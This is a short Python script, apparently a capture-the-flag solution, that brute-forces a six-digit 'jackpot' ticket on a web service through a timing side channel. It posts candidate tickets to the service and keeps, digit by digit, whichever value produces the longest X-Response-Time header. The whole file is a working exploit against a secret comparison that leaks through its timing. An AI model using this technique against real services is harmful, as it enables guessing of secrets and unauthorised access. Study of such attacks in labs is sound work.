#!/usr/bin/env python
import requests

jackpot = ''

for idx in range(0, 6):

    longest = 0
    longest_num = None

    for num in range(0, 10):
        ticket = '{}{}{}'.format(jackpot, num, '0' * (5-idx))
        r = requests.post('https://cf9-jackpot-dtbznhqsyf.now.sh/', { 'ticket': ticket })
        time = int(r.headers['X-Response-Time'].split('ms')[0])
        print('[{}ms] {}'.format(time, ticket))

        if 'Sorry' not in r.text:
            print('[!] Success: {}'.format(r.text))
            exit()

        if (time > longest):
            longest = time
            longest_num = num

    jackpot += str(longest_num)

print('[!] Jackpot = {}'.format(jackpot))
